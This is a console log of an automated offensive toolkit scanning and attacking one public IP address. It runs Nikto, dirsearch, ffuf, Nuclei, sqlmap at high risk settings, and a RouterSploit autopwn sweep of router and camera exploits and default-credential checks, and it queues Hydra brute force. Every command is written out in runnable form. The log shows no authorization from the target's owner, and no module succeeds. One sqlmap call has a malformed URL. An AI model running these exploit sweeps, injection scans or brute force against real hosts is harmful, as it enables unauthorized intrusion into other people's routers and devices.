+http://188.225.136.99 [200 OK] Country[PALESTINIAN TERRITORY OCCUPIED][PS], HTML5, IP[188.225.136.99], Script[text/javascript], Title[WEB SERVICE], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]
+[+] WhatWeb results saved to: /home/kali/router/targets/188.225.136.99/whatweb_port_80.txt
+[*] Metasploit skipped by target profile (not a router/Fortinet CPE fingerprint).
+
+[>] Executing: nikto -h http://188.225.136.99 -o /home/kali/router/targets/188.225.136.99/nikto_port_80.txt -Format txt
+tories found (use '-C all' to force check all possible dirs). CGI tests skipped.
++ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
++ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
++ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
++ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
++ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
++ [000998] /config/: Configuration information may be available remotely.
+- STATUS: Completed 6255 requests (~86% complete, ~2.0 minutes left): currently in plugin 'Nikto Tests'
+- STATUS: Running average: Not enough data.
++ Scan terminated: 20 errors and 6 items reported on the remote host
++ End Time:           2026-05-22 10:26:55 (GMT3) (783 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
++ ERROR: Failed to check for updates: 403
++ ERROR: *** Error limit (20) reached for host, giving up. Last error: error reading HTTP response. ***
++ ERROR: *** Consider using mitmproxy to avoid TLS fingerprinting. ***
+[*] Report updated after Phase 1 - Reconnaissance: /home/kali/router/targets/188.225.136.99/RESULTS_SUMMARY.txt
+
+[*] Target profile updated (after Phase 1) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : web_server (medium)
+  Summary     : HTTP service detected; stack not fully identified.
+  Web ports   : 80
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [SKIP] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [RUN ] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [SKIP] sqlmap: No PHP/query URLs yet — may run on base URL only.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+======================================================
+>>> PHASE 2: Web Enumeration (profile-driven)
+======================================================
+
+[*] Dirsearch → http://188.225.136.99
+
+[+] Running Dirsearch (Path Enumeration) [Deep / Full Power]...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/dirsearch/dirsearch.py -u http://188.225.136.99 -e php,html,bak,js,txt,xml,conf -x 404,500 -t 80 -o /home/kali/router/targets/188.225.136.99/dirsearch_port_80.txt --no-color
+[+] Dirsearch results saved to: /home/kali/router/targets/188.225.136.99/dirsearch_port_80.txt
+[+] Dirsearch discovered 4 paths.
+
+[*] Target profile updated (after Dirsearch) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : router (high)
+  Summary     : Embedded router/CPE web interface patterns.
+  Web ports   : 80
+  Login paths : http://188.225.136.99/cgi-bin/login, http://188.225.136.99/cgi-bin/login.cgi, http://188.225.136.99/cgi-bin/login.php
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [RUN ] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [SKIP] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [RUN ] sqlmap: SQLi testing on PHP/query endpoints.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+[+] Running ffuf for hidden content discovery...
+
+[>] Executing: ffuf -u http://188.225.136.99/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -s -o /home/kali/router/targets/188.225.136.99/ffuf_port_80.json -of json -mc 200,204,301,302,307,401,403,405,500
+[+] ffuf discovered 11 paths.
+
+[*] Target profile updated (after path discovery) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : router (high)
+  Summary     : Embedded router/CPE web interface patterns.
+  Web ports   : 80
+  Login paths : http://188.225.136.99/cgi-bin/login, http://188.225.136.99/cgi-bin/login.cgi, http://188.225.136.99/cgi-bin/login.php
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [RUN ] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [SKIP] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [RUN ] sqlmap: SQLi testing on PHP/query endpoints.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+[+] Nuclei on 1 URL(s), tags=default-logins,cves,misconfiguration,exposed-panel,upnp,rce,zte
+
+[+] Running Nuclei (Vulnerability Scanning) [Deep / Full Power]...
+[*] Nuclei tags (from target profile): default-logins,cves,misconfiguration,exposed-panel,upnp,rce,zte
+
+[>] Executing: /usr/bin/nuclei -validate
+
+[>] Executing: /usr/bin/nuclei -u http://188.225.136.99 -no-color -tags default-logins,cves,misconfiguration,exposed-panel,upnp,rce,zte -silent -jle /home/kali/router/targets/188.225.136.99/nuclei_port_80.jsonl
+
+[>] Executing: /usr/bin/nuclei -u http://188.225.136.99 -no-color -silent -jle /home/kali/router/targets/188.225.136.99/nuclei_port_80_notags.jsonl
+[+] Nuclei found 15 result(s) (0 actionable).
+[*] Nuclei findings are informational/low severity only.
+
+[+] SQLMap (URLs from profile)...
+
+[+] Running SQLMap (SQL Injection Test)...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/sqlmap/sqlmap.py -u http://188.225.136.99 --forms --batch --level=3 --risk=3 --crawl=2 --random-agent --timeout=45 --delay=2
+___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:57:12 /2026-05-22/
+
+[10:57:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36' from file '/home/kali/router/tools/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[10:57:12] [INFO] starting crawler for target URL 'http://188.225.136.99'
+[10:57:12] [INFO] searching for links with depth 1
+[10:57:14] [WARNING] no usable links found (with GET parameters) or forms
+
+[*] ending @ 10:57:14 /2026-05-22/
+[+] SQLMap results saved to: /home/kali/router/targets/188.225.136.99/sqlmap_scan.txt
+
+[+] Running SQLMap (SQL Injection Test)...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/sqlmap/sqlmap.py -u http://188.225.136.99/ --forms --batch --level=3 --risk=3 --crawl=2 --random-agent --timeout=45 --delay=2
+___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:57:23 /2026-05-22/
+
+[10:57:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' from file '/home/kali/router/tools/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[10:57:23] [INFO] starting crawler for target URL 'http://188.225.136.99/'
+[10:57:23] [INFO] searching for links with depth 1
+[10:57:25] [WARNING] no usable links found (with GET parameters) or forms
+
+[*] ending @ 10:57:25 /2026-05-22/
+[+] SQLMap results saved to: /home/kali/router/targets/188.225.136.99/sqlmap_scan.txt
+
+[+] Running SQLMap (SQL Injection Test)...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/sqlmap/sqlmap.py -u http://188.225.136.99/Extensions: php, html, bak, js, txt, xml, conf | HTTP method: GET | Threads: 80 --forms --batch --level=3 --risk=3 --crawl=2 --random-agent --timeout=45 --delay=2
+___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:57:34 /2026-05-22/
+
+[10:57:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0' from file '/home/kali/router/tools/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[10:57:34] [INFO] starting crawler for target URL 'http://188.225.136.99/Extensions: php, html, bak, js, txt, xml, conf | HTTP method: GET | Threads: 80'
+[10:57:34] [INFO] searching for links with depth 1
+[10:57:38] [WARNING] no usable links found (with GET parameters) or forms
+
+[*] ending @ 10:57:38 /2026-05-22/
+[+] SQLMap results saved to: /home/kali/router/targets/188.225.136.99/sqlmap_scan.txt
+[*] Report updated after Phase 2 - Web Enumeration: /home/kali/router/targets/188.225.136.99/RESULTS_SUMMARY.txt
+
+[*] Target profile updated (after Phase 2) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : router (high)
+  Summary     : Embedded router/CPE web interface patterns.
+  Web ports   : 80
+  Login paths : http://188.225.136.99/cgi-bin/login, http://188.225.136.99/cgi-bin/login.cgi, http://188.225.136.99/cgi-bin/login.php
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [RUN ] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [SKIP] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [SKIP] nuclei: Skipped or cautious — prior connectivity failures detected.
+    [SKIP] sqlmap: SQLi testing on PHP/query endpoints.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+======================================================
+>>> PHASE 3: Exploitation (profile-driven)
+======================================================
+
+[+] Running RouterSploit AutoPwn...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/routersploit/rsf.py -m scanners/autopwn -s target 188.225.136.99
+[+] target => 188.225.136.99
+[*] Running module scanners/autopwn...
+
+[*] 188.225.136.99 Starting vulnerablity check...
+[-] 188.225.136.99:80 http exploits/routers/zyxel/d1000_wifi_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/zyxel/d1000_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/zyxel/p660hn_t_v2_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/zyxel/p660hn_t_v1_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/generic/shellshock is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/comtrend/ct_5361t_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/belkin/play_max_prce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/belkin/n750_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/belkin/g_plus_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/belkin/n150_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/belkin/auth_bypass is not vulnerable
+[-] 188.225.136.99:8291 custom/tcp exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/belkin/g_n150_password_disclosure is not vulnerable
+[-] 188.225.136.99:22 ssh exploits/routers/mikrotik/routeros_jailbreak is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netsys/multi_rce is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/shuttle/915wm_dns_change Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/zte/zxv10_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/zte/f460_f660_backdoor is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/bhu/bhu_urouter_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/zte/zxhn_h108n_wifi_password_disclosure is not vulnerable
+[-] 188.225.136.99:22 ssh exploits/generic/ssh_auth_keys is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/multi/misfortune_cookie is not vulnerable
+[-] 188.225.136.99:32764 custom/tcp exploits/routers/multi/tcp_32764_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/multi/rom0 is not vulnerable
+[-] 188.225.136.99:32764 custom/tcp exploits/routers/multi/tcp_32764_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/asus/rt_n16_password_disclosure is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/asus/asuswrt_lan_rce Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/multi/gpon_home_gateway_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/n300_auth_bypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/wnr500_612v3_jnr1010_2010_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/multi_password_disclosure-2017-5521 is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/r7000_r6400_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/dgn2200_ping_cgi_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/prosafe_rce is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/netgear/dgn2200_dnslookup_cgi_rce Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/netgear/multi_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/rax30_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/netgear/jnr1010_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/linksys/1500_2500_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/linksys/smartwifi_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/linksys/eseries_themoon_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/linksys/wap54gv3_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/linksys/wrt100_110_rce is not vulnerable
+[-] 188.225.136.99:22 ssh exploits/routers/fortinet/fortigate_os_backdoor is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/lg/nas_3718 is not vulnerable
+[-] 188.225.136.99:21 ftp exploits/routers/technicolor/tg784_authbypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/technicolor/tc7200_password_disclosure_v2 is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/technicolor/tc7200_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/technicolor/dwg855_authbypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/huawei/hg530_hg520b_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/huawei/e5331_mifi_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/huawei/hg866_password_change is not vulnerable
+[-] 188.225.136.99:80 http exploits/generic/heartbleed is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/huawei/hg532_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/asmax/ar_1004g_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/asmax/ar_804_gu_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/billion/billion_7700nr4_password_disclosure is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/billion/billion_5200w_rce Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/dlink/dsp_w110_rce is not vulnerable
+[-] 188.225.136.99:53413 custom/udp exploits/routers/netcore/udp_53413_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dvg_n5402sp_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dwr_932_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dns_320l_327l_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dsl_2750b_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_300_320_615_auth_bypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/multi_hedwig_cgi_exec is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_8xx_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_655_866_652_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dsl_2750b_rce is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/dlink/dsl_2640b_dns_change Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/dlink/dcs_930l_auth_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dwl_3200ap_password_disclosure is not vulnerable
+[*] 188.225.136.99:1900 custom/udp exploits/routers/dlink/dir_815_850l_rce Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_300_320_600_615_info_disclosure is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/dlink/dsl_2730b_2780b_526b_dns_change Could not be verified
+[*] 188.225.136.99:80 http exploits/routers/dlink/dsl_2740r_dns_change Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_850l_creds_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_645_815_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/multi_hnap_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_825_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_645_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dir_300_600_rce is not vulnerable
+[-] 188.225.136.99:43690 custom/udp exploits/routers/huawei/hg520_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dsl_2730_2750_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/dlink/dgs_1510_add_user is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/3com/officeconnect_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/3com/ap8760_password_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/3com/imc_info_disclosure is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/3com/officeconnect_rce Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/3com/imc_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/tplink/archer_c9_admin_password_reset is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/tplink/wdr740nd_wdr740n_backdoor is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/tplink/archer_c2_c20i_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/tplink/wdr740nd_wdr740n_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/tplink/wdr842nd_wdr842n_configure_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/movistar/adsl_router_bhs_rta_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/2wire/4011g_5012nv_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/2wire/gateway_auth_bypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/thomson/twg850_password_disclosure is not vulnerable
+[-] 188.225.136.99:1900 custom/udp exploits/routers/dlink/dir_300_645_815_upnp_rce is not vulnerable
+[-] 188.225.136.99:39889 custom/udp exploits/routers/dlink/dwr_932b_backdoor is not vulnerable
+[*] 188.225.136.99:23 custom/tcp exploits/routers/cisco/catalyst_2960_rocem Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/cisco/ios_http_authorization_bypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/cisco/firepower_management60_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/cisco/rv320_command_injection is not vulnerable
+[*] 188.225.136.99:80 http exploits/routers/cisco/secure_acs_bypass Could not be verified
+[-] 188.225.136.99:80 http exploits/routers/cisco/unified_multi_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/cisco/dpc2420_info_disclosure is not vulnerable
+[-] 188.225.136.99:69 custom/udp exploits/routers/cisco/ucm_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/cisco/ucs_manager_rce is not vulnerable
+[-] 188.225.136.99:22 snmp exploits/routers/thomson/twg849_info_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/avigilon/videoiq_camera_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/geuterbruck/efd_2250 is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/beward/n100_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/zyxel/zywall_usg_extract_hashes is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/xiongmai/uc_httpd_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/multi/P2P_wificam_credential_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/multi/netwave_ip_camera_information_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/multi/dvr_creds_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/multi/jvc_vanderbilt_honeywell_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/ipfire/ipfire_proxy_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/ipfire/ipfire_oinkcode_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/ipfire/ipfire_shellshock is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/jovision/jovision_credentials_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/dlink/dcs_930l_932l_auth_bypass is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/multi/cctv_dvr_rce is not vulnerable
+[-] 188.225.136.99:23 telnet exploits/cameras/grandstream/gxv3611hd_ip_camera_sqli is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/honeywell/hicc_1100pt_password_disclosure is not vulnerable
+[-] 188.225.136.99:23 telnet exploits/cameras/grandstream/gxv3611hd_ip_camera_backdoor is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/brickcom/users_cgi_creds_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/acti/acm_5611_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/mvpower/dvr_jaws_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/brickcom/corp_network_cameras_conf_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/siemens/cvms2025_credentials_disclosure is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/cisco/video_surv_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/misc/miele/pg8528_path_traversal is not vulnerable
+[-] 188.225.136.99:80 http exploits/misc/wepresent/wipg1000_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/misc/asus/b1m_projector_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/misc/watchguard/xcs_9_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/cameras/multi/P2P_wificam_rce is not vulnerable
+[-] 188.225.136.99:9999 custom/udp exploits/routers/asus/infosvr_backdoor_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/cisco/firepower_management60_rce is not vulnerable
+[-] 188.225.136.99:80 http exploits/routers/ubiquiti/airos_6_x is not vulnerable
+[*] Elapsed time: 55.5900 seconds
+
+[*] 188.225.136.99 Starting default credentials check...
+[-] 188.225.136.99:80 http creds/routers/pfsense/webinterface_http_form_default_creds is not vulnerable
+[-] 188.225.136.99:23 telnet creds/generic/telnet_default is not vulnerable
+[-] 188.225.136.99:22 ssh creds/generic/ssh_default is not vulnerable
+[-] 188.225.136.99:21 ftp creds/generic/ftp_default is not vulnerable
+[-] 188.225.136.99:80 http creds/generic/http_basic_digest_default is not vulnerable
+[-] 188.225.136.99:80 http creds/routers/asmax/webinterface_http_auth_default_creds is not vulnerable
+[-] 188.225.136.99:80 http creds/cameras/canon/webinterface_http_auth_default_creds is not vulnerable
+[-] 188.225.136.99:80 http creds/cameras/basler/webinterface_http_form_default_creds is not vulnerable
+[-] 188.225.136.99:80 http creds/cameras/axis/webinterface_http_auth_default_creds is not vulnerable
+[-] 188.225.136.99:80 http creds/cameras/acti/webinterface_http_form_default_creds is not vulnerable
+[-] 188.225.136.99:80 http creds/cameras/brickcom/webinterface_http_auth_default_creds is not vulnerable
+[*] Elapsed time: 0.0900 seconds
+
+[*] 188.225.136.99 Could not verify exploitability:
+ - 188.225.136.99:80 http exploits/routers/shuttle/915wm_dns_change
+ - 188.225.136.99:80 http exploits/routers/asus/asuswrt_lan_rce
+ - 188.225.136.99:80 http exploits/routers/netgear/dgn2200_dnslookup_cgi_rce
+ - 188.225.136.99:80 http exploits/routers/billion/billion_5200w_rce
+ - 188.225.136.99:80 http exploits/routers/dlink/dsl_2640b_dns_change
+ - 188.225.136.99:1900 custom/udp exploits/routers/dlink/dir_815_850l_rce
+ - 188.225.136.99:80 http exploits/routers/dlink/dsl_2730b_2780b_526b_dns_change
+ - 188.225.136.99:80 http exploits/routers/dlink/dsl_2740r_dns_change
+ - 188.225.136.99:80 http exploits/routers/3com/officeconnect_rce
+ - 188.225.136.99:23 custom/tcp exploits/routers/cisco/catalyst_2960_rocem
+ - 188.225.136.99:80 http exploits/routers/cisco/secure_acs_bypass
+
+[-] 188.225.136.99 Could not confirm any vulnerablity
+
+[-] 188.225.136.99 Could not find default credentials
+
+/home/kali/router/tools/routersploit/routersploit/resources/wordlists/__init__.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+/usr/local/lib/python3.13/dist-packages/paramiko/pkey.py:82: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  "cipher": algorithms.TripleDES,
+/usr/local/lib/python3.13/dist-packages/paramiko/transport.py:253: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  "class": algorithms.TripleDES,
+[+] RouterSploit results saved to: /home/kali/router/targets/188.225.136.99/routersploit_scan.txt
+
+[+] Running Ingram (Embedded Devices Exploit)...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/ingram/run_ingram.py -i /home/kali/router/targets/188.225.136.99/ingram_target.txt -o /home/kali/router/targets/188.225.136.99/ingram_results
+                         
+          _    __..-:┑   
+   ║`====╩=╩=======╣ |   
+==#║_______███_/ @ ║ |  
+   ╚===.===╦==╦=╤==╩#█  :::  :::.    :::.    .,-:::::/    :::::::..       :::.       .        :   
